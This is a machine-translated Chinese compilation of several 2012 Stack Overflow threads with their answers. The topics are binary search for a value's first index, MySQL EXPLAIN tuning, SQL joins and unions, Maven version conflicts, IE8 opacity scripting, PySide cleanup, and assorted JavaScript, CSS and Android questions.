# python - 在预排序数组中查找给定值的最低索引

> ID：10148849
> 
> 赞同：10
> 
> 时间：2012-04-13T21:58:08.690
> 
> 标签：python, algorithm

嘿，我在一次采访中遇到了这个问题，想知道解决它的最佳方法是什么。所以假设你得到一个已经排序的数组，你想找到某个值 x 的最低索引。

这是我想出的python /伪代码，我只是想知道是否有更好的方法来解决它？

```
def findLowestIndex(arr, x):
     index = binarySearch(0, len(arr), x)
     if index != -1:
         while index > 0:
           if arr[index] == arr[index-1]:
              index -= 1
           else:
              break
     return index 
```

谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-13T22:14:15.953

在最坏的情况下，您的方法需要线性时间，即当`x`数组中 s 的计数为 O( *n* ) 时。

O(lg *n* ) 解可以通过改变二分搜索本身来找到`x`数组中的第一个而不是其中任何一个来获得：

```
def binary_search(x, a):
    lo = 0
    hi = len(a)

    while lo < hi:
        mid = (lo + hi) // 2

        if a[mid] < x:
            lo = mid + 1
        elif a[mid] > x:
            hi = mid
        elif mid > 0 and a[mid-1] == x:
            hi = mid
        else:
            return mid

    return -1 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-13T22:08:22.950

```
import bisect
l = [1,2,3,4,4,4,4,4,5,5,5,5,5,6,6,7,7,7,8,8]
bisect.bisect_left(l, 4) 
```

编辑：我只是想念一件事。bisect 会给你一个插入点。因此，如果 x 不在列表中，您仍然会有一个结果索引。所以你需要先检查 x 是否在列表中：

```
if x in l:
    .... 
```

但是对于面试问题，他们可能想看看你是如何提出算法而不是使用库的......

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-13T22:14:31.563

如果**元素是整数**- 或枚举，你可以做得更快一点：

请注意，在二进制搜索[算法，而不是 python 函数]中，如果一个元素不存在 - 你可以找到比索引大的最小元素。

1.  首先搜索`x`- 并获取索引，让它成为`i`.
2.  接下来，搜索`x-1`. 如果它不在列表中，则二进制搜索可以找到您的第一个索引 if `x`。
3.  如果它在列表中，则让找到的索引为`j`：
    *   对子列表 from `j`to进行二分搜索`i`，并搜索一个元素，使得`list[k] < list[k+1]`

对于**未枚举的值**，也可以通过减小范围的相同想法来完成，`list[k] < list[k+1] and list[k+1] == x`但我发现首先理解它是如何处理整数的，然后将其应用于一般解决方案更简单。

请注意，**此解决方案是`O(logn)`**，而**您提出的简单解决方案是`O(n)`**，在有很多欺骗的列表中，因为二分搜索之后的迭代步骤。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-12-03T13:48:41.203

递归版本，如果有人感兴趣...

[从https://github.com/reneargento/algorithms-sedgewick-wayne/blob/master/src/chapter1/section4/Exercise10.java](https://github.com/reneargento/algorithms-sedgewick-wayne/blob/master/src/chapter1/section4/Exercise10.java)重写，来自*Algorithms 4th*的练习。

```
def binary_search(key, a, low, high):
    if low > high:
        return -1;
    middle = low + (high - low) / 2;
    if a[middle] < key:
        return binary_search(key, a, middle + 1, high)
    elif a[middle] > key:
        return binary_search(key, a, low, middle - 1)
    else:
        if (middle - 1 >= 0) and (a[middle - 1] != key):
            return middle
        else:
            index = binary_search(key, a, 0, middle - 1)
            if(index == -1):
                return middle;
            else:
                return index;

a = [1,2,3,3,3,3,4,5,6,7,7,8,9]

print(binary_search(7, a, 0, len(a))) 
```

递归版本不是总是比非递归版本更简单吗？为什么这看起来更难..？谁能写一个更好的递归版本：D？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-13T22:16:04.437

如果`x`不是`X`这样，`f(x) = v`那么答案是微不足道的：二进制搜索来找出答案。

如果有`x`这样一个，`f(x) = v`那么答案也是微不足道的：二分搜索找出答案。

这个问题只有在有多个`x`这样的情况下才是有趣的`f(x) = v`。如果`x`'s 的数量是恒定的，那么从算法上讲，二分搜索是最佳的。只需二进制搜索并按顺序检查较低的索引。

但是，如果有很多这样`x`的 怎么办？像这样的顺序搜索显然不是最优的。事实上，如果有`c * |X|` `x`'s 那么这运行在`O(|X|)`.

相反，可以做的是初始化并`lbound`进行`0`二分搜索，直到找到元素 at `i`，每次向右时，更新`lbound`到刚刚使用的中间值。然后从`[lbound, i - 1]`. 这样做直到`i == lbound`找不到元素。如果发生前者，则所需索引为`0`。如果发生后者，则所需的索引是先前`i`使用的。最坏的情况是所需的索引是`0`。

有趣的是`log(|X|)`，我认为这仍然会及时运行。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-01-02T15:14:34.780

[二进制搜索中相等方法的延迟检测](http://en.wikipedia.org/wiki/Binary_search_algorithm#Deferred_detection_of_equality)给出最小索引，减少相等分支。

```
def binary_search(low, high, target, array):
    while low < high:
        mid = low + (high - low) / 2
        if a[mid] < target:
            low = mid + 1
        else:
            high = mid

    if (array[low] == target) return low
    else return -1 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2012-04-13T22:13:14.210

我敢打赌gddc的评论是python最快的答案。否则，您的一般算法是正确的，除了在某些情况下您可以击败二进制搜索的 O(log n) 行为。具体来说，在整数的情况下，您可以获得的最佳最坏情况行为是 O(sqrt(log n))： [https ://stackoverflow.com/questions/4057258/faster-than-binary-search-for-ordered-列表](https://stackoverflow.com/a/4057372/425458)

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2012-04-14T09:34:10.127

修改二分搜索以首次找到任何出现的 x。

# mysql - 如何根据 EXPLAIN 计划优化 MySQL 查询

> ID：10148851
> 
> 赞同：21
> 
> 时间：2012-04-13T21:58:24.530
> 
> 标签：mysql, query-optimization

查看查询的`EXPLAIN`计划，如何确定可以在哪里进行最佳优化？

我很欣赏首先要检查的事情之一是是否使用了好的索引，但除此之外我有点难过。通过过去的反复试验，我有时发现执行连接的顺序可能是一个很好的改进来源，但是如何通过查看执行计划来确定呢？

虽然我非常希望对如何优化查询有一个很好的一般理解（建议阅读非常感谢！），但我也意识到讨论具体案例通常比抽象讨论更容易。由于我目前正在用这个把头撞在墙上，因此您的想法将不胜感激：

```
id select_type table type possible_keys key key_len ref rows Extra
 1 SIMPLE S const PRIMARY,l,p,f4 PRIMARY 2 const 1 使用临时
 1 SIMPLE Q ref PRIMARY,SS 2 const 204 使用索引
 1 SIMPLE V ref PRIMARY,n,QQ 5 const,db.Q.QID 6 使用 where；使用索引；清楚的
 1 SIMPLE R1 ref PRIMARY,LL 154 const,db.V.VID 447 使用索引；清楚的
 1 SIMPLE W eq_ref PRIMARY,w PRIMARY 5 const,db.R.R.RID,const 1 使用 where；清楚的
 1 SIMPLE R2 eq_ref PRIMARY,L PRIMARY 156 const,db.W.RID,const 1 使用 where；清楚的

```

我将执行计划的最后一行解释如下是否正确：

*   由于它的主键完全匹配，因此`R2`每个输出行只需要获取一行；
*   但是，这些输出行随后会根据适用于`R2`?

如果是这样，我的问题在于最后一步中发生的过滤。如果条件导致没有过滤（例如`WHERE `Col_1_to_3` IN (1,2,3)`），则查询运行得非常快（~50ms）；但是，如果条件限制了选定的行 ( `WHERE `Col_1_to_3` IN (1,2)`)，则查询需要相当长的时间 (~5s)。如果限制是单个匹配`WHERE `Col_1_to_3` IN (1)`（似乎没有更好的索引可以在该表上使用（假设它已经完全使用主键来为每个结果返回一行？）。

应该如何解释所有这些信息？我猜对了吗，因为这样的输出过滤发生在要连接的最终表上，与更早加入表并更快地过滤这些行相比，浪费了大量的精力？如果是这样，如何确定何时`R2`应该加入执行计划？

虽然我拒绝在此处完整包含查询和架构（因为我真的很可能知道要寻找什么，而不仅仅是被告知答案），但我理解有必要推进讨论：

```
SELECT DISTINCT
    `Q`.`QID`
FROM
    `S`
    NATURAL JOIN `Q`
    NATURAL JOIN `V`
    NATURAL JOIN `R` AS `R1`
    NATURAL JOIN `W`

    JOIN `R` AS `R2` ON (
            `R2`.`SID` = `S`.`SID`
        AND `R2`.`RID` = `R1`.`RID`
        AND `R2`.`VID` = `S`.`V_id`
        AND `R2`.`Col_1_to_3` IN (1,2) -- this is where performance suffers!
    )

WHERE
    AND `S`.`SID` = @x
    AND `W`.`WID` = @y
; 
```

表的定义`R`是：

```
CREATE TABLE `R` (
  `SID` smallint(6) unsigned NOT NULL,
  `RID` smallint(6) unsigned NOT NULL,
  `VID` varchar(50) NOT NULL DEFAULT '',
  `Col_1_to_3` smallint(1) DEFAULT NULL,
  `T` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`SID`,`RID`,`VID`),
  KEY `L` (`SID`,`VID`,`Col_1_to_3`),
  CONSTRAINT `R_f1` FOREIGN KEY (`SID`) REFERENCES `S` (`SID`),
  CONSTRAINT `R_f2` FOREIGN KEY (`SID`, `VID`) REFERENCES `V` (`SID`, `VID`),
  CONSTRAINT `R_f3` FOREIGN KEY (`SID`, `VID`, `Col_1_to_3`) REFERENCES `L` (`SID`, `VID`, `LID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-04-13T22:57:33.160

取决于您要做什么以及查询是什么。

通常，对于 EXPLAIN 中具有 的每一行`Using where`，您需要使用索引（`possible keys`和`keys`列）来获取它。这些是您的过滤器，包括 WHERE 和 ON。有话说`Using index`就更好了。这意味着有一个覆盖索引，MySQL 可以直接从索引中检索数据，而不是访问表数据中的行。

应该查看没有`Using where`并且返回大量行的行。这些是表中所有行的返回值。我不知道你的查询是什么，所以我不知道是否要在这里惊慌。尝试过滤结果集以减小大小并提高性能。

通常，您应该尽量避免看到`Using filesort`or `Using temporary`，尽管如果您不期待它们，它们只会是不好的。

Filesort 通常与 ORDER 子句一起出现。您通常希望 MySQL 使用覆盖索引 ( `Using index`) 以便从服务器按顺序返回行。如果不是，那么 MySQL 必须在之后使用 filesort 对它们进行排序。

`Using temporary`当它引用派生表时可能会很糟糕，因为它们没有索引。看来您已经显式创建了一个带有索引的临时表，所以在这里，它还不错。有时，您唯一的选择是使用派生表，因此`Using temporary`.

# sql-server - 用可为空的外键连接两个表？

> ID：10148856
> 
> 赞同：12
> 
> 时间：2012-04-13T21:59:12.667
> 
> 标签：sql-server, tsql

我在下面创建了两个表，`FK_TypeID`在这种情况下可以为空。我想写一个查询返回两个表的*连接*。

如果某行为 NULL ，`FK_TypeID`则*也*`TypeName`为*NULL*。我不知道如何去创建这样的加入声明？

```
[Actions]
ActionsID
Date
Message
FK_TypeID //links to the table below

[Type]
TypeID
TypeName 
```

我当前的语句看起来像这样，它只是跳过*NULL* `FK_TypeID`行

```
SELECT        *
FROM            Actions 
INNER JOIN      TypeName ON Actions.FK_TypeID = [Type].TypeID 
```

帮助将不胜感激！

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-04-13T22:02:18.473

你只需要使用一个`LEFT JOIN`

```
SELECT Actions.Date, Actions.Message, Type.TypeName
FROM Actions
    LEFT JOIN Type 
        ON Type.TypeID = Actions.FK_TypeID 
```

如果`Actions`没有找到匹配到的匹配项`Type`，则 中的所有列都`Type`将是`NULL`。

[这是 SQL 中不同类型连接的良好图形可视化](http://www.codinghorror.com/blog/2007/10/a-visual-explanation-of-sql-joins.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T23:57:55.067

使用外连接

```
SELECT Actions.Date, Actions.Message, Type.TypeName 
FROM   Actions LEFT OUTER JOIN 
           Type ON Type.TypeID = Actions.FK_TypeID 
```

# maven - 对两个版本的 Jar 的依赖

> ID：10148857
> 
> 赞同：0
> 
> 时间：2012-04-13T21:59:12.357
> 
> 标签：maven, maven-2

我有一个模块 X，它依赖于第三方库，而第三方库又依赖于 apache-commons-collections 2.1。

在模块 X 中，我想使用最新的 apache-commons-collections 3.0，它比 2.1 有一些额外的方法。如果我将依赖项添加到 3.0，我猜这会产生问题，因为类加载器只会选择它在类路径中看到的第一个类。有没有解决这个问题的好方法？

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T22:52:57.277

恕我直言，如果没有额外的模块化解决方案（如 Java EE 的 EAR 或 OSGi），就没有**真正好的方法。**但是，我想您只是在询问直接使用此 3rd 方库的简单网络（或不）模块。恐怕您必须手动解决此冲突。事实上，Maven 不会提供 2 个版本`commons-collections`并依赖于类加载器的解析，而是解析依赖关系图并选择它认为它更好地考虑您的 POM 声明的版本。这意味着，如果您在模块 X 中声明对版本 3.0 的依赖`commons-collections`，则将使用该版本，因为此声明比某些 3rd 方库的依赖项更重要。

这是 Java 平台本身的一个严重问题，引发了诸如著名的 JAR 地狱之类的问题。不幸的是，选择和声明`commons-collections`满足您和您的第 3 方库的版本是您的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T22:37:40.983

只需将 3.0 的依赖项添加到您的项目中，它就会比旧版本的 2.1 更喜欢它。明确地说，您可以添加排除项。在任何情况下，使用依赖插件以及分析和树目标来查看发生了什么。

长话短说……这种情况一直都在发生并且会很好，无论如何你都可以控制发生的事情。

# javascript - 使用 Javascript onkeyup() 更改 IE8 中的不透明度（再次）

> ID：10148867
> 
> 赞同：1
> 
> 时间：2012-04-13T22:00:12.640
> 
> 标签：javascript, internet-explorer-8, filter, opacity, alpha

我提前为发布*另一个*IE 不透明度问题而道歉，但我已经阅读了至少 30 个不同的页面（很多在 SO 上）并且无法使其工作。

我正在尝试根据用户在卡号字段中输入的第一个字符来动态更改美国 4 种主要信用卡类型（Visa、MC、Amex、Discover）的不透明度`<input>`。

我的代码在 IE9、Firefox、Safari 和 Chrome 中运行良好，但当然不是 IE8，这是 Windows XP 支持所必需的。

我尝试使用以下设置：

```
object.style.filter = 'alpha(opacity=13)';
object.filter = 'alpha(opacity=13)';
object.style.filter = 'progid:DXImageTransform.Microsoft.Alpha(Opacity=13)'; 
```

我什至尝试将 O 中的 Opacity 大写，没想到它会有所帮助......

有谁知道我错过了什么？

一个 JQuery 解决方案很好，但我想知道出于学术原因在 Javascript 中是否有可能......

我有以下 HTML：

```
<span>
  <input name='cardnumber' value="3717XXXXXXX8775" type='text' id='cardnumber' onkeyup='setCardType();'>
</span>
<span>
  <img src='/style/icon_visa.gif' id='visa' alt='This is a Visa' style='opacity:.13;filter:alpha(opacity=13);'>&nbsp;&nbsp;
  <img src='/style/icon_mastercard.gif' id='mastercard' alt='This is a MasterCard' style='opacity:.13;filter:alpha(opacity=13);'>&nbsp;&nbsp;
  <img src='/style/icon_amex.gif' id='amex' alt='This is an American Express' style='opacity:1;filter:alpha(opacity=100);'>&nbsp;&nbsp;
  <img src='/style/icon_discover.gif' id='discover' alt='This is a Discover Card' style='opacity:.13;filter:alpha(opacity=13);'>
</span>
<input type='hidden' name='cardtype' id='cardtype' value="American Express"> 
```

和以下Javascript：

```
function setCardType() {
var cardnumber = document.getElementById('cardnumber').value;
cardnumber = cardnumber.replace(/[^0-9]/g,'');
document.getElementById('cardnumber').value = cardnumber;

var firstchar = document.getElementById('cardnumber').value.charAt(0);
if (firstchar == 3) {
    if (document.getElementById('visa').style.opacity) {
        document.getElementById('visa').style.opacity = .13;
        document.getElementById('mastercard').style.opacity = .13;
        document.getElementById('amex').style.opacity = 1;
        document.getElementById('discover').style.opacity = .13;
    }
    else {
        document.getElementById('visa').style.filter = 'alpha(opacity=13)';
        document.getElementById('mastercard').style.filter = 'alpha(opacity=13)';
        document.getElementById('amex').style.filter = 'alpha(opacity=100)';
        document.getElementById('discover').style.filter = 'alpha(opacity=13)';
    }
    document.getElementById('confirmCardType').innerHTML = 'American Express';
}
else if (firstchar == 4) {
    if (document.getElementById('visa').style.opacity) {
        document.getElementById('visa').style.opacity = 1;
        document.getElementById('mastercard').style.opacity = .13;
        document.getElementById('amex').style.opacity = .13;
        document.getElementById('discover').style.opacity = .13;
    }
    else {
        document.getElementById('visa').style.filter = 'alpha(opacity=100)';
        document.getElementById('mastercard').style.filter = 'alpha(opacity=13)';
        document.getElementById('amex').style.filter = 'alpha(opacity=13)';
        document.getElementById('discover').style.filter = 'alpha(opacity=13)';
    }
    document.getElementById('confirmCardType').innerHTML = 'Visa';
}
else if (firstchar == 5) {
    if (document.getElementById('visa').style.opacity) {
        document.getElementById('visa').style.opacity = .13;
        document.getElementById('mastercard').style.opacity = 1;
        document.getElementById('amex').style.opacity = .13;
        document.getElementById('discover').style.opacity = .13;
    }
    else {
        document.getElementById('visa').style.filter = 'alpha(opacity=13)';
        document.getElementById('mastercard').style.filter = 'alpha(opacity=100)';
        document.getElementById('amex').style.filter = 'alpha(opacity=13)';
        document.getElementById('discover').style.filter = 'alpha(opacity=13)';
    }
    document.getElementById('confirmCardType').innerHTML = 'MasterCard';
}
else if (firstchar == 6) {
    if (document.getElementById('visa').style.opacity) {
        document.getElementById('visa').style.opacity = .13;
        document.getElementById('mastercard').style.opacity = .13;
        document.getElementById('amex').style.opacity = .13;
        document.getElementById('discover').style.opacity = 1;
    }
    else {
        document.getElementById('visa').style.filter = 'alpha(opacity=13)';
        document.getElementById('mastercard').style.filter = 'alpha(opacity=13)';
        document.getElementById('amex').style.filter = 'alpha(opacity=13)';
        document.getElementById('discover').style.filter = 'alpha(opacity=100)';
    }
    document.getElementById('confirmCardType').innerHTML = 'Discover';
}
else {
    if (document.getElementById('visa').style.opacity) {
        document.getElementById('visa').style.opacity = .13;
        document.getElementById('mastercard').style.opacity = .13;
        document.getElementById('amex').style.opacity = .13;
        document.getElementById('discover').style.opacity = .13;
    }
    else {
        document.getElementById('visa').style.filter = 'alpha(opacity=13)';
        document.getElementById('mastercard').style.filter = 'alpha(opacity=13)';
        document.getElementById('amex').style.filter = 'alpha(opacity=13)';
        document.getElementById('discover').style.filter = 'alpha(opacity=13)';
    }
    document.getElementById('confirmCardType').innerHTML = '';
}
return true; 
```

}

编辑：这是 jQuery 解决方案，它大大缩短了代码：

```
function setCardType() {
var cardnumber = document.getElementById('cardnumber').value;
cardnumber = cardnumber.replace(/[^0-9]/g,'');
document.getElementById('cardnumber').value = cardnumber;

var firstchar = cardnumber.charAt(0);
if (firstchar == 3) {
    $('#visa').css('opacity', .13);
    $('#mastercard').css('opacity', .13);
    $('#amex').css('opacity', 1);
    $('#discover').css('opacity', .13);
    document.getElementById('confirmCardType').innerHTML = 'American Express';
}
else if (firstchar == 4) {
    $('#visa').css('opacity', 1);
    $('#mastercard').css('opacity', .13);
    $('#amex').css('opacity', .13);
    $('#discover').css('opacity', .13);
    document.getElementById('confirmCardType').innerHTML = 'Visa';
}
else if (firstchar == 5) {
    $('#visa').css('opacity', .13);
    $('#mastercard').css('opacity', 1);
    $('#amex').css('opacity', .13);
    $('#discover').css('opacity', .13);
    document.getElementById('confirmCardType').innerHTML = 'MasterCard';
}
else if (firstchar == 6) {
    $('#visa').css('opacity', .13);
    $('#mastercard').css('opacity', .13);
    $('#amex').css('opacity', .13);
    $('#discover').css('opacity', 1);
    document.getElementById('confirmCardType').innerHTML = 'Discover';
}
else {
    $('#visa').css('opacity', .13);
    $('#mastercard').css('opacity', .13);
    $('#amex').css('opacity', .13);
    $('#discover').css('opacity', .13);
    document.getElementById('confirmCardType').innerHTML = '';
}
return true; 
```

}

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T22:29:40.447

```
$("#visa").css("opacity", .13); 
```

jQuery 会自动为您处理交叉兼容性问题。太棒了...

# python - 让我的垃圾收集保留对子小部件的 pyside/Qt 引用作为成员变量会妨碍正确清理吗？

> ID：10148869
> 
> 赞同：0
> 
> 时间：2012-04-13T22:00:29.517
> 
> 标签：python, qt, garbage-collection, pyside

从垃圾收集/正确清理的角度来看，这是我所拥有的：

```
class MyWidget(QWidget):
    def __init__(self,qtParent):
        QWidget.__init__(self,qtParent):

        self.mySubWidget = MySubWidget(self)  # <-- keeping a direct reference to the child 
```

当我销毁 MyWidget 时，当我调用下面的代码时，mySubWidget 是否也会被 Qt/pyside/python 正确销毁？

```
setAttribute( Qt.DeleteOnClose, True)
myWidget.close() 
```

或者，我应该使用如下所示的弱引用吗？

```
import weakref

class MyWidget(QWidget):
    def __init__(self,qtParent):
        QWidget.__init__(self,qtParent):

        self.mySubWidget = weakref.ref(MySubWidget(self)) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T22:05:21.420

第一个很好。如果您没有对`MySubWidget`实例外部创建的任何其他引用，那么当您删除实例时，它将被垃圾收集`MyWidget`。

# asp.net - xml阅读器不读取xml文件并显示在标签中

> ID：10148872
> 
> 赞同：-1
> 
> 时间：2012-04-13T22:01:26.647
> 
> 标签：asp.net

这段代码应该从现有的 xml 文件中读取，并将内容写入标签，但是，它不起作用，我不知道我哪里出错了。帮助将不胜感激。

```
Dim reader As New XmlTextReader(Server.MapPath("~/ex01/docP.xml"))
            'declare variable to record when a <name> element is found'
            Dim bName As Boolean = False
            'iterate through all of the nodes in the XML document'
            While reader.Read()
                'look at the node type of each node'
                Select Case reader.NodeType
                    'if node is a <name> element, remember it'
                    Case XmlNodeType.Element
                        If reader.Name = "name" Then
                            bName = True
                        End If
                        'if node is text & previous node was <name>, add it to Label'
                    Case XmlNodeType.Text
                        If bName Then
                            lblDisplayXml.Text &= reader.ReadString & "<br/>"
                            'reset variable for next node'
                            bName = False
                        End If
                End Select
            End While
        End Sub
    End Class 
```

xml文件：

```
<?xml version="1.0" standalone="yes"?>
<book_club>
  <book>
    <isbn>0-13-129014-2</isbn>
    <title>JAVA How to Program (6th Ed)</title>
    <author>PJ &amp; HM Deitel</author>
    <price>£39.99</price>
  </book>
  <book>
    <isbn>0-67-232238-2</isbn>
    <title>Teach Yourself UML</title>
    <author>J Schmuller</author>
    <price>£9.99</price>
  </book>
  <book>
    <isbn>0-27-365575-2</isbn>
    <title>Practical Business Systems Development using SSADM</title>
    <author>P Weaver, N Lambrou &amp; M Walkley</author>
    <price>£34.99</price>
  </book>
  <book>
    <isbn>0-67-232422-9</isbn>
    <title>XML Primer Plus</title>
    <author>N Chase</author>
    <price>£32.99</price>
  </book>
  <book>
    <isbn>0-78-972476-6</isbn>
    <title>XML and Java from Scratch</title>
    <author>N Chase</author>
    <price>£19.99</price>
  </book>
  <book>
    <isbn>1234567890</isbn>
    <title>ASP.NET for Dummies</title>
    <author>RUA Dummy</author>
    <price>free!!</price>
  </book>
</book_club> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T22:19:18.120

您的 xml 中没有 <name> 元素，因此标签永远不会分配任何值。

# javascript - 跳过匹配项的 Javascript 替换函数

> ID：10148875
> 
> 赞同：0
> 
> 时间：2012-04-13T22:01:30.877
> 
> 标签：javascript, replace

中的第二个“senzajs”`<map>`没有被替换，但我希望它......

Javascript

```
 <script  type="text/javascript">
  $("document").ready(function(){
     $('body').html($('body').html().replace('senzajs', 'js'));
   });
  </script> 
```

HTML

```
 <div class="objectdiv">
   <a href="freegames/Classic/svgsenzajs/start.php/">
    <object class="svg" type="image/svg+xml"  data="svg/question0optimize1.svg" >
         <img src="png/question0optimize1.png" type="image/png" usemap="#mapping"/>    
     </object>   
   </a>
   <map name="mapping">
        <area shape="rect" coords="0,0,1000,1000" 
         href="freegames/Classic/pngsenzajs/start.php/" />
    </map>
 </div> 
```

为什么会这样？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T22:02:49.860

使用`.replace(/senzajs/g, 'js')`. 带有`g`标志的正则表达式将匹配所有匹配项，而不仅仅是第一个匹配项。

[https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/replace](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/replace)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T22:04:47.007

您需要在此处使用正则表达式，否则仅替换找到的第一个字符串。/senzajs/g 将匹配所有找到的，大小写完全相同。添加 i 以忽略大小写 /senzajs/gi ，因此即使 SENZJAS 也会被替换。

```
<script  type="text/javascript">
  $("document").ready(function(){
     $('body').html($('body').html().replace(/senzajs/g, 'js'));
   });
  </script> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-13T22:05:21.123

您使用的替换功能仅替换它找到的第一个实例。使用正则表达式替换所有实例：

```
var myNewString = myOldString.replace(/username/g, visitorName); 
```

（我从[http://www.tizag.com/javascriptT/javascript-string-replace.php](http://www.tizag.com/javascriptT/javascript-string-replace.php)提出了这个。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-13T22:06:55.520

```
 <script  type="text/javascript">
  $("document").ready(function(){
     $('body').html($('body').html().replace('/senzajs/gm', 'js'));
   });
  </script> 
```

# css - 正文：overflow-x - 仍然可以使用触控板滚动

> ID：10148879
> 
> 赞同：5
> 
> 时间：2012-04-13T22:02:16.650
> 
> 标签：css, overflow, css-position, trackpad

我有一个带有`position: absolute`set 的 div，它只是比我的浏览器窗口宽一点。我已经成功隐藏了水平滚动条，但我仍然可以使用**Macbook**触控板进行滚动。

有什么办法可以规避这种情况吗？

```
<div id="container">
    <div id="big-image"></div>
</div><!-- #container -->

#container {
    overflow-x: hidden;
}

#big-image {
    background: transparent url('/path/to/image.png') no-repeat center top;
    position: absolute;
    width: 1307px;
    left: 50%;
    margin: 0 0 0 -653.5px;
    z-index: 4;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-13T22:46:11.420

如果您不限制#container 的高度，只需将溢出设置为隐藏，因为溢出-x 很奇怪，它删除了滚动条，但仍然允许您滚动。

**例子**

```
body {
    overflow-x: hidden;
}

#container {
    overflow: hidden;
    width: 100%;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T22:21:42.470

您可能可以`position: fixed;`在`#big-image`.

# jquery - 如何在处理后自动弹出 JqModal

> ID：10148880
> 
> 赞同：0
> 
> 时间：2012-04-13T22:02:16.790
> 
> 标签：jquery

我想问一下。做某事后如何自动弹出自动..

```
if ($a!=NULL)
<a href="javascript:$.modaldialog.error('<?php echo $result; ?>');">Success</a>
<pre class="prettyprint">
$.modaldialog.error('');
</pre>
else
<a href="javascript:$.modaldialog.error('<?php echo $result; ?>');">Failed</a>
<pre class="prettyprint">
$.modaldialog.error('');
</pre> 
```

但在那种情况下。我们必须先点击成功。我想自动而不点击它。并直接弹出弹出窗口。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-14T00:10:42.793

我不确定您要在这里做什么，但您可以在页面加载时自动打开它，如下所示：

```
<script type="text/javascript">

jQuery().ready(function($){

      $('#jqModal').jqmShow();

});
</script> 
```

或者，如果您尝试首先从 php 页面获取状态并根据响应显示一条消息，例如：

```
$.ajax({
  type: "POST",
  url: "some.php",
  data: "var1=value1"
}).done(function( msg ) {
  //logic for message here
  $('#jqModal').jqmShow();
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-14T00:51:34.757

这是您传递消息的方式：

```
<div id="jqModal" class="jqmWindow" style="display: none;"></div>

<script type="text/javascript">

jQuery().ready(function($){

$('#jqModal').jqm({onShow:setText}); 
$('#jqModal').jqmShow();

function setText(){
   $('#jqModal').text("success");
}

});
</script> 
```

# android - Android：为硬件键盘编写自己的“处理程序”？

> ID：10148882
> 
> 赞同：0
> 
> 时间：2012-04-13T22:02:21.640
> 
> 标签：android, keyboard

我拥有一个带有美国键盘底座的华硕变压器（第一个型号）。

但是，我是法国人，因此必须经常用法语进行互动，其中包括写带重音的字母。

据我所知，目前的解决方法基本上是弹出软键盘，不是很方便。

Mac OS X 中使用了一种能够使用传统 QWERTY 布局编写重音符号（和其他特殊字母，例如 ß）的实现。对于那些不知道的人，这是通过按 alt + a-key- 来完成的。这通常很有意义（我不是在开玩笑，它们真的很有意义），这会给你重音，然后是你想要重音的字母（所以 alt + e，然后是 e会给你é）。

这就是我想要实现的行为。但是，我真的没有找到我必须这样做的地方。

我查看了有关键盘设备的文档（[http://source.android.com/tech/input/keyboard-devices.html](http://source.android.com/tech/input/keyboard-devices.html)），但我认为这不是进行任何更改的正确位置，因为我不想这样做更改任何键盘映射或键码。

另一方面，我看了一眼[https://github.com/android/platform_frameworks_base/tree/master/core/java/android/inputmethodservice](https://github.com/android/platform_frameworks_base/tree/master/core/java/android/inputmethodservice)（尤其是keyboard.java和keyboardview.java），但我有这样的印象与软件键盘更相关。

有人对此有更多线索吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-09T08:28:11.180

我在 TF101 上输入俄语字符时遇到了类似的问题。我更习惯于拼音布局而不是标准布局。

我能够修改 Android 示例应用程序 SoftKeyboard 来实现这一点。[您可以在https://protronika.dyndns.org/websvn/listing.php?repname=FLEXKBD&path=%2F&sc=0](https://protronika.dyndns.org/websvn/listing.php?repname=FLEXKBD&path=%2F&sc=0)找到代码。

抱歉，代码非常原始，很多东西都是硬编码的。我最近开始了那个项目。所以它处于“正常工作”状态。

# sql-server - 从多个 SQL Server 表中选择 TOP 4 记录。使用 vb.net

> ID：10148883
> 
> 赞同：2
> 
> 时间：2012-04-13T22:02:28.503
> 
> 标签：sql-server, vb.net

我有大约 4 个具有完全相同列名的不同表。我想做的是从按日期排序的所有这些表中选择前 4 条记录（因为日期是它们共享的列之一）。

我不断收到错误的陈述，无论是语法问题还是模棱两可的记录等。

基本上我的陈述类似于：

```
SELECT TOP 4 date, link, anchor, thumb FROM archive1, archive2, archive3, archive4 ORDER BY date DESC 
```

很明显，我对所有这些东西都是新手。提前感谢您的任何帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-13T22:07:14.180

您需要生成所有表的并[集](http://msdn.microsoft.com/en-us/library/ms180026%28v=sql.105%29.aspx)，然后命令它们获得最后四个：

```
SELECT TOP 4 date, link, anchor, thumb 
FROM
(
  SELECT date, link, anchor, thumb 
    FROM archive1
   UNION ALL
  SELECT date, link, anchor, thumb 
    FROM archive2
   UNION ALL
  SELECT date, link, anchor, thumb 
    FROM archive3
   UNION ALL
  SELECT date, link, anchor, thumb 
   FROM archive4 
) archive
ORDER BY date DESC 
```

